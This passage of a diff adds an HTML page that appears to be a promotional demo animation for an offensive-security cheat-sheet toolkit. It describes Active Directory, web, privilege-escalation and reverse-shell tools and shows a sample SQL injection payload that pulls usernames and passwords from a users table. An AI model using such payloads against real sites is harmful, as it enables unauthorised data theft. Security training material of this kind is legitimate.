@@ -1,0 +1,926 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mahdiesta Arsenal — LinkedIn Demo</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+
+/* ═══ CANVAS: 1280×720 ═══ */
+html,body{width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;}
+.canvas{
+  width:1280px;height:720px;
+  background:radial-gradient(ellipse 90% 70% at 40% 40%,#060d18 0%,#030608 55%,#020408 100%);
+  position:relative;overflow:hidden;flex-shrink:0;
+}
+.canvas::before{
+  content:'';position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(34,211,238,.025) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(34,211,238,.025) 1px,transparent 1px);
+  background-size:50px 50px;pointer-events:none;z-index:0;
+}
+/* subtle glow behind macbook */
+.canvas::after{
+  content:'';position:absolute;
+  left:20px;top:50%;transform:translateY(-50%);
+  width:700px;height:500px;
+  background:radial-gradient(ellipse at 50% 50%,rgba(34,211,238,.06) 0%,transparent 70%);
+  pointer-events:none;z-index:0;
+}
+
+/* ═══ MACBOOK ═══ */
+.macbook{
+  position:absolute;left:22px;top:50%;transform:translateY(-50%);
+  display:flex;flex-direction:column;align-items:center;z-index:10;
+}
+.mac-lid{
+  width:686px;
+  background:linear-gradient(180deg,#d2d2d2 0%,#bebebe 40%,#adadad 100%);
+  border-radius:14px 14px 0 0;
+  padding:10px 10px 0;
+  box-shadow:
+    0 0 0 1px rgba(0,0,0,.45),
+    0 28px 80px rgba(0,0,0,.95),
+    inset 0 1px 0 rgba(255,255,255,.35);
+}
+.mac-camera{
+  width:8px;height:8px;
+  background:#252525;border-radius:50%;
+  margin:0 auto 6px;
+  box-shadow:inset 0 0 3px rgba(0,0,0,.8),0 0 3px rgba(34,211,238,.2);
+}
+.mac-bezel{
+  background:#101010;border-radius:6px 6px 0 0;
+  padding:5px 5px 0;
+}
+.mac-browser{
+  width:100%;height:458px;
+  background:#020408;border-radius:3px 3px 0 0;
+  overflow:hidden;display:flex;flex-direction:column;
+}
+/* Chrome bar */
+.mac-bar{
+  height:36px;background:#1b1b1b;
+  display:flex;align-items:center;
+  padding:0 12px;gap:10px;flex-shrink:0;
+  border-bottom:1px solid #282828;
+}
+.tls{display:flex;gap:7px;}
+.tl{width:11px;height:11px;border-radius:50%;}
+.tl.r{background:#ff5f57;}
+.tl.y{background:#febc2e;}
+.tl.g{background:#28c840;}
+.mac-url{
+  flex:1;height:22px;background:#282828;
+  border-radius:5px;display:flex;align-items:center;
+  padding:0 10px;gap:5px;
+  font:10px/1 'SF Mono','Courier New',monospace;
+  color:#888;margin:0 32px;letter-spacing:-.2px;overflow:hidden;white-space:nowrap;
+}
+.url-lock{color:#4ade80;font-size:9px;}
+/* Content */
+.mac-content{flex:1;position:relative;overflow:hidden;}
+
+/* Base */
+.mac-base{
+  width:726px;height:11px;
+  background:linear-gradient(180deg,#989898 0%,#b5b5b5 25%,#adadad 100%);
+  border-radius:0 0 6px 6px;
+  box-shadow:0 5px 28px rgba(0,0,0,.75);
+  position:relative;
+}
+.mac-base::before{
+  content:'';position:absolute;
+  bottom:0;left:50%;transform:translateX(-50%);
+  width:140px;height:100%;
+  background:rgba(0,0,0,.13);border-radius:0 0 4px 4px;
+}
+
+/* ═══ RIGHT INFO PANEL ═══ */
+.info-panel{
+  position:absolute;right:18px;top:50%;transform:translateY(-50%);
+  width:408px;z-index:20;
+}
+.info-card{
+  position:absolute;width:100%;
+  opacity:0;transform:translateX(18px);
+  transition:opacity .65s ease,transform .65s ease;
+  pointer-events:none;top:0;
+}
+.info-card.active{opacity:1;transform:translateX(0);}
+
+.itag{
+  display:inline-flex;align-items:center;gap:5px;
+  background:rgba(34,211,238,.1);color:#22d3ee;
+  border:1px solid rgba(34,211,238,.25);
+  border-radius:4px;padding:3px 10px;
+  font:700 9px/1 -apple-system,sans-serif;
+  letter-spacing:1.2px;text-transform:uppercase;margin-bottom:10px;
+}
+.ihead{
+  font:700 28px/1.15 -apple-system,'SF Pro Display',sans-serif;
+  color:#f1f5f9;margin-bottom:10px;
+}
+.ihead span{color:#22d3ee;}
+.ibody{font:13px/1.65 -apple-system,sans-serif;color:#8898aa;margin-bottom:14px;}
+.ibullets{list-style:none;display:flex;flex-direction:column;gap:7px;}
+.ibullets li{
+  display:flex;align-items:flex-start;gap:8px;
+  color:#c8d6e5;font:12px/1.45 -apple-system,sans-serif;
+}
+.ibullets li::before{content:'▸';color:#22d3ee;flex-shrink:0;margin-top:1px;}
+.istats{display:flex;gap:10px;margin-top:16px;}
+.istat{
+  background:rgba(34,211,238,.04);
+  border:1px solid rgba(34,211,238,.13);
+  border-radius:10px;padding:10px 14px;
+  text-align:center;flex:1;
+}
+.istat-n{font:800 26px/1 'SF Mono','Courier New',monospace;color:#22d3ee;}
+.istat-l{font:9px/1 -apple-system,sans-serif;color:#475569;margin-top:3px;text-transform:uppercase;letter-spacing:.5px;}
+.github-pill{
+  margin-top:16px;
+  background:rgba(34,211,238,.06);
+  border:1px solid rgba(34,211,238,.2);
+  border-radius:8px;padding:10px 16px;
+  font:11px/1 'SF Mono','Courier New',monospace;color:#22d3ee;
+  display:flex;align-items:center;gap:8px;
+}
+
+/* ═══ SCENES ═══ */
+.scene{
+  position:absolute;inset:0;
+  opacity:0;transition:opacity .55s ease;
+  background:#020408;overflow:hidden;
+}
+.scene.active{opacity:1;}
+
+/* shared tokens */
+:root{
+  --c:#22d3ee;--p:#f472b6;--o:#fb923c;--r:#f87171;
+  --v:#c084fc;--g:#4ade80;--a:#fbbf24;
+  --bg1:#0d111c;--brd:#151b2b;--brd2:#1e2a3a;
+  --t:#e2e8f0;--ts:#64748b;--tm:#94a3b8;
+}
+
+/* ── SCENE 1: Home grid ── */
+.s1{padding:13px 13px 6px;}
+.s1-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:8px;}
+.s1-prompt{font:10px/1 'SF Mono',monospace;color:var(--c);margin-bottom:3px;}
+.s1-title{font:700 16px/1 -apple-system,sans-serif;color:var(--t);}
+.s1-sub{font:9px/1 -apple-system,sans-serif;color:var(--ts);margin-top:2px;}
+.s1-search{
+  height:26px;background:var(--bg1);
+  border:1px solid var(--brd2);border-radius:6px;
+  display:flex;align-items:center;padding:0 10px;gap:6px;
+  font:10px/1 -apple-system,sans-serif;color:var(--ts);width:190px;flex-shrink:0;
+}
+.filters{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px;}
+.fb{
+  padding:3px 9px;border-radius:20px;
+  border:1px solid var(--brd);
+  font:9px/1 -apple-system,sans-serif;color:var(--ts);
+  display:flex;align-items:center;gap:3px;
+}
+.fb.on{border-color:var(--c);color:var(--c);background:rgba(34,211,238,.05);}
+.fb.sql{border-color:var(--p);color:var(--p);}
+.fb.web{border-color:var(--o);color:var(--o);}
+.fb.priv{border-color:var(--r);color:var(--r);}
+.fb.sh{border-color:var(--v);color:var(--v);}
+.fb.os{border-color:var(--g);color:var(--g);}
+.cnt{font-size:8px;opacity:.7;}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:7px;}
+.tc{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-radius:8px;padding:9px;position:relative;overflow:hidden;
+}
+.tc::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.tc.ad::after{background:var(--c);}
+.tc.sql::after{background:var(--p);}
+.tc.web::after{background:var(--o);}
+.tc.priv::after{background:var(--r);}
+.tc.sh::after{background:var(--v);}
+.tc.os::after{background:var(--g);}
+.ti{
+  width:24px;height:24px;border-radius:5px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:12px;margin-bottom:5px;
+}
+.ti.ad{background:rgba(34,211,238,.1);}
+.ti.sql{background:rgba(244,114,182,.1);}
+.ti.web{background:rgba(251,146,60,.1);}
+.ti.priv{background:rgba(248,113,113,.1);}
+.ti.sh{background:rgba(192,132,252,.1);}
+.ti.os{background:rgba(74,222,128,.1);}
+.tn{font:600 10px/1 -apple-system,sans-serif;color:var(--t);margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.td{font:8.5px/1.3 -apple-system,sans-serif;color:#3d4f66;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+.tm2{
+  margin-top:5px;font:8px/1 'SF Mono',monospace;color:var(--c);
+  display:flex;align-items:center;gap:4px;
+}
+.bw{font:700 7px/1 -apple-system,sans-serif;padding:1px 5px;border-radius:3px;background:rgba(251,191,36,.12);color:var(--a);}
+
+/* ── SCENE 2: AD ── */
+.s2{padding:13px;}
+.sh2{
+  display:flex;align-items:center;gap:9px;
+  margin-bottom:11px;padding-bottom:9px;
+  border-bottom:1px solid var(--brd);
+}
+.si{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:15px;}
+.si.ad{background:rgba(34,211,238,.1);}
+.si.sql{background:rgba(244,114,182,.1);}
+.si.web{background:rgba(251,146,60,.1);}
+.si.priv{background:rgba(248,113,113,.1);}
+.stitle{font:700 14px/1 -apple-system,sans-serif;color:var(--t);}
+.ssub{font:9px/1 -apple-system,sans-serif;color:var(--ts);margin-top:2px;}
+.scnt{margin-left:auto;font:10px/1 'SF Mono',monospace;color:var(--c);}
+.ad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
+.adc{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-left:3px solid var(--c);border-radius:8px;padding:10px;
+}
+.adc-t{font:600 10px/1 -apple-system,sans-serif;color:var(--t);margin-bottom:4px;}
+.adc-d{font:8.5px/1.35 -apple-system,sans-serif;color:var(--ts);}
+.adc-tag{
+  display:inline-block;margin-top:6px;
+  background:rgba(34,211,238,.07);color:var(--c);
+  border-radius:3px;padding:2px 6px;
+  font:7.5px/1 'SF Mono',monospace;
+}
+.chain-bar{
+  margin-top:10px;background:var(--bg1);
+  border:1px solid var(--brd);border-radius:7px;
+  padding:9px 12px;display:flex;align-items:center;
+  gap:8px;font:9px/1 -apple-system,sans-serif;color:var(--ts);flex-wrap:wrap;
+}
+.chain-lbl{font:700 9px/1 'SF Mono',monospace;color:var(--c);}
+.chain-arr{color:var(--c);opacity:.6;}
+
+/* ── SCENE 3: SQLi ── */
+.s3{padding:13px;}
+.sqtabs{display:flex;gap:1px;margin-bottom:11px;border-bottom:1px solid var(--brd);padding-bottom:0;}
+.sqtab{
+  padding:5px 9px;font:9px/1 -apple-system,sans-serif;color:var(--ts);
+  border-bottom:2px solid transparent;margin-bottom:-1px;border-radius:4px 4px 0 0;
+}
+.sqtab.on{color:var(--p);border-bottom-color:var(--p);background:rgba(244,114,182,.04);}
+.wiz{
+  background:var(--bg1);border:1px solid var(--brd2);
+  border-left:3px solid var(--p);border-radius:8px;padding:11px;margin-bottom:8px;
+}
+.wiz-lbl{
+  display:inline-block;background:rgba(244,114,182,.12);color:var(--p);
+  border-radius:4px;padding:2px 8px;font:700 9px/1 -apple-system,sans-serif;margin-bottom:5px;
+}
+.wiz-d{font:9px/1.45 -apple-system,sans-serif;color:var(--ts);}
+.codeblock{
+  background:#010306;border:1px solid var(--brd2);
+  border-radius:6px;padding:9px 11px;
+  font:9px/1.55 'SF Mono','Courier New',monospace;
+  color:var(--tm);margin-top:9px;position:relative;
+}
+.ck{color:var(--p);} .cs{color:var(--g);} .cc{color:var(--ts);}
+.copybtn{
+  position:absolute;right:7px;top:7px;
+  background:var(--brd2);border-radius:4px;
+  padding:2px 7px;font:7px/1.5 -apple-system,sans-serif;color:var(--ts);
+}
+.sq-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;margin-top:9px;}
+.sq-stat{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-radius:6px;padding:9px;text-align:center;
+}
+.sq-n{font:800 18px/1 'SF Mono',monospace;color:var(--p);}
+.sq-l{font:8px/1 -apple-system,sans-serif;color:var(--ts);margin-top:3px;}
+
+/* ── SCENE 4: Web ── */
+.s4{padding:13px;}
+.web-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;}
+.wc{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-top:3px solid var(--o);border-radius:8px;padding:10px;
+}
+.wc-t{font:600 10px/1 -apple-system,sans-serif;color:var(--t);margin-bottom:4px;}
+.wc-d{font:8.5px/1.35 -apple-system,sans-serif;color:var(--ts);}
+.attack-chain{
+  background:var(--bg1);border:1px solid var(--brd2);
+  border-radius:8px;padding:10px;margin-top:9px;
+}
+.ac-t{font:700 9px/1 'SF Mono',monospace;color:var(--o);margin-bottom:7px;}
+.ac-flow{display:flex;align-items:center;gap:4px;flex-wrap:wrap;}
+.ac-step{
+  background:rgba(251,146,60,.07);
+  border:1px solid rgba(251,146,60,.2);
+  border-radius:4px;padding:3px 8px;
+  font:8px/1 -apple-system,sans-serif;color:var(--o);
+}
+.ac-arr{color:var(--ts);font-size:10px;}
+
+/* ── SCENE 5: PrivEsc ── */
+.s5{padding:13px;}
+.analyzer{
+  background:var(--bg1);border:1px solid var(--brd2);
+  border-radius:8px;padding:11px;margin-bottom:9px;
+}
+.az-t{
+  font:600 11px/1 -apple-system,sans-serif;color:var(--r);
+  display:flex;align-items:center;gap:6px;margin-bottom:8px;
+}
+.az-input{
+  background:#010306;border:1px solid var(--brd2);
+  border-radius:6px;padding:8px;
+  font:8px/1.6 'SF Mono','Courier New',monospace;
+  color:#475569;width:100%;height:72px;
+}
+.az-label{font:9px/1 -apple-system,sans-serif;color:var(--ts);margin-bottom:7px;}
+.res-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;}
+.rc{
+  background:#010306;border:1px solid var(--brd2);
+  border-radius:6px;padding:8px;
+}
+.rc.h{border-left:3px solid var(--r);}
+.rc.m{border-left:3px solid var(--a);}
+.rc.l{border-left:3px solid var(--g);}
+.rc-t{font:600 9px/1 -apple-system,sans-serif;color:var(--t);margin-bottom:3px;}
+.rc-d{font:7.5px/1.35 -apple-system,sans-serif;color:var(--ts);}
+.sev{display:inline-block;font:700 7px/1 -apple-system,sans-serif;padding:2px 5px;border-radius:3px;margin-top:5px;}
+.sev.h{background:rgba(248,113,113,.12);color:var(--r);}
+.sev.m{background:rgba(251,191,36,.12);color:var(--a);}
+.sev.l{background:rgba(74,222,128,.12);color:var(--g);}
+
+/* ── SCENE 6: Search ── */
+.s6{padding:13px;}
+.search-active{
+  height:32px;background:var(--bg1);
+  border:1.5px solid var(--c);border-radius:8px;
+  display:flex;align-items:center;padding:0 12px;gap:8px;
+  margin-bottom:11px;box-shadow:0 0 14px rgba(34,211,238,.1);
+}
+.sa-icon{color:var(--c);font-size:12px;}
+.sa-text{font:12px/1 'SF Mono',monospace;color:var(--t);}
+.cursor{
+  display:inline-block;width:2px;height:14px;
+  background:var(--c);vertical-align:middle;
+  animation:blink 1s infinite;
+}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+.sr-cnt{font:9px/1 -apple-system,sans-serif;color:var(--ts);margin-bottom:8px;}
+.sr-list{display:flex;flex-direction:column;gap:6px;}
+.sr{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-radius:8px;padding:9px 11px;
+  display:flex;align-items:center;gap:10px;
+}
+.sr-ic{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0;}
+.sr-b{flex:1;}
+.sr-t{font:600 10px/1 -apple-system,sans-serif;color:var(--t);}
+.sr-n{font:8.5px/1 -apple-system,sans-serif;color:var(--ts);margin-top:3px;}
+.sr-m{
+  background:rgba(34,211,238,.12);color:var(--c);
+  border-radius:3px;padding:2px 6px;
+  font:7.5px/1 'SF Mono',monospace;flex-shrink:0;
+}
+
+/* ── SCENE 7: Variable Sync ── */
+.s7{padding:13px;}
+.varbar{
+  background:var(--bg1);border:1px solid var(--brd2);
+  border-radius:8px;padding:9px 13px;
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:10px;flex-wrap:wrap;
+}
+.vl{font:700 8px/1 'SF Mono',monospace;color:var(--ts);}
+.vi{
+  background:#010306;border:1px solid var(--c);
+  border-radius:5px;padding:4px 10px;
+  font:10px/1 'SF Mono',monospace;color:var(--c);
+}
+.vapply{
+  margin-left:auto;background:var(--c);color:#020408;
+  border-radius:5px;padding:4px 10px;
+  font:700 9px/1 -apple-system,sans-serif;
+}
+.cmd-list{display:flex;flex-direction:column;gap:5px;}
+.ci{
+  background:var(--bg1);border:1px solid var(--brd);
+  border-radius:6px;padding:8px 11px;
+  font:9px/1 'SF Mono',monospace;color:var(--tm);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.ci .ip{color:var(--c);font-weight:700;}
+.ci .cpy{
+  background:var(--brd2);border-radius:3px;
+  padding:2px 6px;font:7px/1.5 -apple-system,sans-serif;
+  color:var(--ts);flex-shrink:0;margin-left:8px;
+}
+
+/* ── SCENE 8: End ── */
+.s8{
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  position:relative;
+}
+.s8::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse at 50% 50%,rgba(34,211,238,.09) 0%,transparent 65%);
+}
+.end-n{font:10px/1 'SF Mono',monospace;color:var(--c);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;}
+.end-t{font:800 21px/1.2 -apple-system,sans-serif;color:var(--t);text-align:center;margin-bottom:4px;}
+.end-s{font:12px/1 -apple-system,sans-serif;color:var(--ts);margin-bottom:18px;}
+.end-link{
+  display:flex;align-items:center;gap:8px;
+  background:rgba(34,211,238,.07);
+  border:1px solid rgba(34,211,238,.25);
+  border-radius:8px;padding:8px 18px;
+  font:11px/1 'SF Mono',monospace;color:var(--c);
+  margin-bottom:14px;
+}
+.end-stats{display:flex;gap:10px;position:relative;}
+.es{
+  background:rgba(34,211,238,.04);
+  border:1px solid rgba(34,211,238,.13);
+  border-radius:8px;padding:9px 16px;text-align:center;
+}
+.es-n{font:800 20px/1 'SF Mono',monospace;color:var(--c);}
+.es-l{font:8px/1 -apple-system,sans-serif;color:var(--ts);margin-top:3px;text-transform:uppercase;}
+
+/* ═══ HUD ═══ */
+.hud-label{
+  position:absolute;top:18px;left:22px;z-index:30;
+  display:flex;align-items:center;gap:7px;
+  font:10px/1 'SF Mono',monospace;color:var(--ts);
+}
+.hud-dot{
+  width:7px;height:7px;background:var(--c);
+  border-radius:50%;animation:hpulse 2s infinite;
+  box-shadow:0 0 8px rgba(34,211,238,.5);
+}
+@keyframes hpulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.5;transform:scale(.8);}}
+.brand{
+  position:absolute;top:18px;right:18px;z-index:30;text-align:right;
+}
+.brand-n{font:700 15px/1 -apple-system,sans-serif;color:var(--t);letter-spacing:-.3px;}
+.brand-s{font:10px/1 'SF Mono',monospace;color:var(--c);margin-top:2px;}
+
+/* Progress */
+.prog-wrap{
+  position:absolute;bottom:14px;left:22px;right:18px;z-index:30;
+  display:flex;align-items:center;gap:10px;
+}
+.prog-track{flex:1;height:3px;background:rgba(255,255,255,.07);border-radius:2px;overflow:hidden;}
+.prog-fill{
+  height:100%;border-radius:2px;width:0%;
+  background:linear-gradient(90deg,var(--c),#60a5fa);
+  transition:width .4s linear;
+  box-shadow:0 0 8px rgba(34,211,238,.4);
+}
+.prog-time{font:10px/1 'SF Mono',monospace;color:var(--ts);flex-shrink:0;width:36px;text-align:right;}
+
+/* Scene dots */
+.scene-dots{
+  position:absolute;bottom:14px;left:50%;transform:translateX(-50%);
+  display:flex;gap:6px;z-index:31;
+}
+.sdot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,.15);transition:background .3s;}
+.sdot.on{background:var(--c);box-shadow:0 0 6px rgba(34,211,238,.5);}
+
+/* Fade in for page load */
+@keyframes fadeIn{from{opacity:0;transform:scale(.98);}to{opacity:1;transform:scale(1);}}
+.canvas{animation:fadeIn .8s ease forwards;}
+</style>
+</head>
+<body>
+<div class="canvas">
+
+  <!-- HUD -->
+  <div class="hud-label">
+    <div class="hud-dot"></div>
+    <span id="hud-text">mahdiesta@arsenal:~# ls tools/</span>
+  </div>
+  <div class="brand">
+    <div class="brand-n">Mahdiesta</div>
+    <div class="brand-s">@mahdiesta</div>
+  </div>
+
+  <!-- ═══ MACBOOK ═══ -->
+  <div class="macbook">
+    <div class="mac-lid">
+      <div class="mac-camera"></div>
+      <div class="mac-bezel">
+        <div class="mac-browser">
+          <div class="mac-bar">
+            <div class="tls"><div class="tl r"></div><div class="tl y"></div><div class="tl g"></div></div>
+            <div class="mac-url"><span class="url-lock">🔒</span><span id="url-txt">cybershells.com/notmain/TheCompleteMahdiestaArsenal/</span></div>
+          </div>
+          <div class="mac-content">
+
+            <!-- ── S1: Home ── -->
+            <div class="scene s1 active" id="s1">
+              <div class="s1-top">
+                <div>
+                  <div class="s1-prompt">mahdiesta@arsenal:~# <span style="color:var(--t)">ls tools/</span></div>
+                  <div class="s1-title">Mahdiesta Arsenal</div>
+                  <div class="s1-sub">Offensive Security Toolkit — 17 Interactive Cheat Sheets</div>
+                </div>
+                <div class="s1-search"><span style="color:var(--c);font-size:11px">🔍</span><span>Search tools, commands...</span></div>
+              </div>
+              <div class="filters">
+                <div class="fb on">All <span class="cnt">17</span></div>
+                <div class="fb on" style="border-color:var(--c);color:var(--c);background:rgba(34,211,238,.05)">AD <span class="cnt">6</span></div>
+                <div class="fb sql">SQL <span class="cnt">2</span></div>
+                <div class="fb web">Web <span class="cnt">4</span></div>
+                <div class="fb os">OSINT <span class="cnt">1</span></div>
+                <div class="fb sh">Shell <span class="cnt">1</span></div>
+                <div class="fb priv">PrivEsc <span class="cnt">3</span></div>
+              </div>
+              <div class="grid">
+                <div class="tc ad"><div class="ti ad">🎯</div><div class="tn">AD Boom V2</div><div class="td">325+ commands, decision trees, live relevance scoring</div><div class="tm2">325+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc ad"><div class="ti ad">🩸</div><div class="tn">BloodHound 1337</div><div class="td">Cypher queries, attack paths, kerberoast chains</div><div class="tm2">200+ cmds</div></div>
+                <div class="tc ad"><div class="ti ad">📜</div><div class="tn">ADCS ESC1–ESC16</div><div class="td">Certificate attacks, shadow credentials, PassTheCert</div><div class="tm2">100+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc ad"><div class="ti ad">⚡</div><div class="tn">NetExec Guide</div><div class="td">261 commands — SMB/LDAP/WinRM/MSSQL/SSH</div><div class="tm2">261 cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc sql"><div class="ti sql">💉</div><div class="tn">SQLi Operator V17</div><div class="td">10+ generators, WAF bypass, blind/union/error, RCE</div><div class="tm2">1000+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc web"><div class="ti web">🌐</div><div class="tn">Web Arsenal</div><div class="td">XSS, LFI, SSRF, XXE, SSTI, file upload payloads</div><div class="tm2">300+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc web"><div class="ti web">🔑</div><div class="tn">AuthBreaker</div><div class="td">JWT forge, MFA bypass, brute force, SQLi login</div><div class="tm2">150+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc web"><div class="ti web">🔎</div><div class="tn">WebEnum Arsenal</div><div class="td">20-phase recon workflow, JWT decode, export scripts</div><div class="tm2">200+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc priv"><div class="ti priv">🔼</div><div class="tn">PrivEsc Toolkit</div><div class="td">Smart analyzer — paste systeminfo, get exploits</div><div class="tm2">1000+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc priv"><div class="ti priv">🎭</div><div class="tn">Token Privilege</div><div class="td">SeImpersonate, SeBackup, SeDebug abuse guides</div><div class="tm2">500+ cmds</div></div>
+                <div class="tc sh"><div class="ti sh">🐚</div><div class="tn">PT Toolkit</div><div class="td">File transfer, 20+ reverse shells, listener commands</div><div class="tm2">100+ cmds <span class="bw">WIZARD</span></div></div>
+                <div class="tc os"><div class="ti os">🔍</div><div class="tn">OSINT Dorks</div><div class="td">80+ dorks — Google, GitHub, Shodan, Censys</div><div class="tm2">80+ dorks <span class="bw">WIZARD</span></div></div>
+              </div>
+            </div>
+
+            <!-- ── S2: AD ── -->
+            <div class="scene s2" id="s2">
+              <div class="sh2">
+                <div class="si ad">🎯</div>
+                <div><div class="stitle">Active Directory</div><div class="ssub">Complete attack chain — recon to domain compromise</div></div>
+                <div class="scnt">6 tools · 1000+ cmds</div>
+              </div>
+              <div class="ad-grid">
+                <div class="adc"><div class="adc-t">🎯 AD Boom V2</div><div class="adc-d">325+ commands with decision trees and live relevance scoring. The central AD pentest intelligence engine.</div><div class="adc-tag">325+ cmds · WIZARD</div></div>
+                <div class="adc"><div class="adc-t">🔄 AD Lateral Movement</div><div class="adc-d">34 MITRE-mapped techniques. Pass-the-Hash, Pass-the-Ticket, DCOM, WMI, PSExec with fallback chains.</div><div class="adc-tag">34 techniques · MITRE</div></div>
+                <div class="adc"><div class="adc-t">📜 ADCS ESC1–ESC16</div><div class="adc-d">Full certificate attack coverage. Shadow credentials, PassTheCert, HTB walkthroughs for every ESC.</div><div class="adc-tag">ESC1–16 · WIZARD</div></div>
+                <div class="adc"><div class="adc-t">⚡ NetExec Guide</div><div class="adc-d">261 commands across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS. Complete protocol coverage.</div><div class="adc-tag">261 cmds · 9 protocols</div></div>
+                <div class="adc"><div class="adc-t">🩸 BloodHound 1337</div><div class="adc-d">Cypher query library, attack path analysis, kerberoast chains, ACL abuse, no-path fallbacks.</div><div class="adc-tag">Cypher · Attack paths</div></div>
+                <div class="adc"><div class="adc-t">🔴 bloodyAD Arsenal</div><div class="adc-d">DACL abuse chains. GenericWrite/All, ForceChangePassword, AddMember, ownership takeover.</div><div class="adc-tag">DACL · ACL abuse</div></div>
+              </div>
+              <div class="chain-bar">
+                <span class="chain-lbl">CHAIN</span>
+                <span>Enum</span><span class="chain-arr">→</span>
+                <span>Kerberos</span><span class="chain-arr">→</span>
+                <span>DACL Abuse</span><span class="chain-arr">→</span>
+                <span>Certs</span><span class="chain-arr">→</span>
+                <span>Lateral</span><span class="chain-arr">→</span>
+                <span>DA</span>
+              </div>
+            </div>
+
+            <!-- ── S3: SQLi ── -->
+            <div class="scene s3" id="s3">
+              <div class="sh2">
+                <div class="si sql">💉</div>
+                <div><div class="stitle">SQLi Operator V17</div><div class="ssub">Full attack chain — discovery to reverse shell</div></div>
+                <div class="scnt" style="color:var(--p)">1000+ cmds</div>
+              </div>
+              <div class="sqtabs">
+                <div class="sqtab on">🧭 Attack Wizard</div>
+                <div class="sqtab">⚡ Union</div>
+                <div class="sqtab">👁 Blind</div>
+                <div class="sqtab">💥 Error</div>
+                <div class="sqtab">🛡 WAF Bypass</div>
+                <div class="sqtab">🚀 RCE</div>
+                <div class="sqtab">🗺 SQLMap</div>
+                <div class="sqtab">🔬 Corrector</div>
+              </div>
+              <div class="wiz">
+                <div class="wiz-lbl">UNION INJECTION WIZARD</div>
+                <div class="wiz-d">Context-aware guided flow — column detection → visible cols → fingerprint → schema enum → data extraction → RCE</div>
+                <div class="codeblock">
+                  <span class="cc">-- Step 1: Detect columns</span><br>
+                  <span class="ck">id=1</span> ORDER BY <span class="cs">5</span><span class="cc">-- -</span><br>
+                  <span class="ck">id=1</span> UNION SELECT <span class="cs">NULL,NULL,NULL,NULL,NULL</span><span class="cc">-- -</span><br>
+                  <span class="cc">-- Step 3: Extract credentials</span><br>
+                  <span class="ck">id=0</span> UNION SELECT <span class="cs">1,username,password,4,5</span> FROM <span class="cs">users</span><span class="cc">-- -</span>
+                  <div class="copybtn">⎘ Copy</div>
+                </div>
+              </div>
+              <div class="sq-stats">
+                <div class="sq-stat"><div class="sq-n">10+</div><div class="sq-l">Generators</div></div>
+                <div class="sq-stat"><div class="sq-n">23</div><div class="sq-l">Failure Modes</div></div>
+                <div class="sq-stat"><div class="sq-n">5</div><div class="sq-l">DBMS Covered</div></div>
+              </div>
+            </div>
+
+            <!-- ── S4: Web ── -->
+            <div class="scene s4" id="s4">
+              <div class="sh2">
+                <div class="si web">🌐</div>
+                <div><div class="stitle">Web Exploitation</div><div class="ssub">4 specialized tools — recon to full compromise</div></div>
+              </div>
+              <div class="web-grid">
+                <div class="wc"><div class="wc-t">🌐 Web Arsenal</div><div class="wc-d">XSS, LFI, RFI, SSRF, XXE, SSTI, file upload exploitation. 300+ payloads with context-aware generators and WAF bypass.</div></div>
+                <div class="wc"><div class="wc-t">🔎 WebEnum Arsenal</div><div class="wc-d">20-phase recon workflow. Directory brute, subdomain enum, JWT decode, tech fingerprint, export scripts.</div></div>
+                <div class="wc"><div class="wc-t">🔑 AuthBreaker</div><div class="wc-d">JWT forge, cookie decoder, MFA/OTP bypass, brute force generator, SQLi login bypass wizard.</div></div>
+                <div class="wc"><div class="wc-t">💀 Cmd Injector V5</div><div class="wc-d">227 OS command injection techniques. Filter bypass, blind injection, OOB exfil, shell upgrade.</div></div>
+              </div>
+              <div class="attack-chain">
+                <div class="ac-t">⚡ ATTACK CHAIN COVERAGE</div>
+                <div class="ac-flow">
+                  <div class="ac-step">Recon</div><div class="ac-arr">→</div>
+                  <div class="ac-step">XSS / LFI</div><div class="ac-arr">→</div>
+                  <div class="ac-step">Auth Bypass</div><div class="ac-arr">→</div>
+                  <div class="ac-step">SSRF / XXE</div><div class="ac-arr">→</div>
+                  <div class="ac-step">File Upload</div><div class="ac-arr">→</div>
+                  <div class="ac-step">Cmd Injection</div><div class="ac-arr">→</div>
+                  <div class="ac-step">RCE</div><div class="ac-arr">→</div>
+                  <div class="ac-step">Shell</div>
+                </div>
+              </div>
+            </div>
+
